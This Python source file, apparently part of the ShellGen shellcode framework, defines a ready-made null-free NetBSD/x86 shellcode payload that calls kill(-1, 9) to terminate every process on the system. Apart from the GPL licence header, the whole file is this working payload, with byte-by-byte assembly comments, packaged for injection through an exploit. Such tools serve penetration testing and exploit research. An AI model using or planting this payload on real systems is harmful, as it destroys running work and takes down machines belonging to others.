#!/usr/bin/env python

###############################################################################
# NetBSD/x86 - kills all processes in the system                              #
# Shellcode for ShellGen                                                      #
###############################################################################

# Copyright (c) 2012 Mario Vilas
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

from shellgen import Static

class KillAllProcesses (Static):
    arch      = "x86"
    os        = "netbsd"
    requires  = ()
    provides  = ()
    qualities = ("nullfree")

    bytes = (

        # int sys_kill(int pid, int signum);
        "\x6a\x09"          # push    9         ; signum = 9
        "\x31\xc0"          # xor     eax, eax
        "\x48"              # dec     eax
        "\x50"              # push    eax       ; pid = -1
        "\x40"              # inc     eax
        "\xb0\x25"          # mov     al, 25h
        "\x50"              # push    eax       ; syscall = 0x25
        "\xcd\x80"          # int     80h
    )
